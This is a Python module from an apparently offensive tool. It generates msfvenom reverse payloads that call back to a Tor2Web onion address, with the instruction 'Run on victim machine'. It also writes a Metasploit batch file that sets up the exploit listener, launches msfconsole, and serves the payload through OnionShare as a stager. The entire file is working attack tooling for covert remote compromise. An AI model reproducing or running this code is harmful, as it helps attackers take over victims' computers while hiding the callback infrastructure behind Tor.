import os
import sys
import shlex
import subprocess


def get_public_resources(resource_name):
    """Returns the path value of resource_name"""
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), 'public', resource_name)


def generate_rc_payload(hostname, payload, output):
    """Generating msfvenom payload"""
    # Check if msfvenom is installed
    rc = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
    if rc:
        print('\n')
        print('[!] Unable to find msfvenom! Exiting..')
        exit(0)
    print(" * Generating msfvenom %s payload.." % payload)
    print('\n')
    # Append .ws Tor2Web extension
    lhost = hostname + ".ws"
    # Generate payload
    msfvenom_cmd = "msfvenom -p %s LHOST=%s LPORT=80 > %s" % (payload, lhost, output)
    subprocess.call(msfvenom_cmd, stdout=subprocess.PIPE, shell=True)
    print(" * payload generated in %s - Run on victim machine" % output)


def generate_msfc_batch(exploit, payload, lhost, lport):
    """Generate metasploit batch .rc file"""
    with open(get_public_resources('msfconsole.rc'), 'w') as f:
        f.write("use %s\n" % exploit)
        f.write("set PAYLOAD %s\n" % payload)
        f.write("set LHOST %s\n" % lhost)
        f.write("set LPORT %d\n" % lport)
        f.write("exploit -jz\n")

    print(" * batch file generated in %s" % get_public_resources("msfconsole.rc"))
    print('\n')
    # Asking for valid response
    while True:
        response = input("[!] Start msfconsole now? [yes/no] ")
        if not response.isalpha():
            continue
        if response == 'yes' or response == 'no':
            break

    if response == 'yes':
        subprocess.Popen(['xterm', '-e', 'msfconsole -q -r %s' % get_public_resources('/msfconsole.rc')])


def generate_onionshare_stagger(outfile):
    rc = subprocess.call(['which', 'onionshare'], stdout=subprocess.PIPE)
    if rc:
        print('\n')
        print('[!] Unable to find onionshare ! Exiting...')
        exit(0)
    else:
        # Start OnionShare FTP
        print(' * Starting OnionShare solution...')
        # os.system('onionshare %s --public --website --disable_csp --receive --data-dir %s' % (outfile, ))
        if sys.platform == 'nt':
            print('onionshare %s --public --website --disable_csp --receive --data-dir %s' % outfile)
            args = shlex.split('onionshare %s --website --public --disable_csp' % outfile)
        else:
            args = shlex.split('onionshare %s --website' % outfile)
        subprocess.Popen(args)
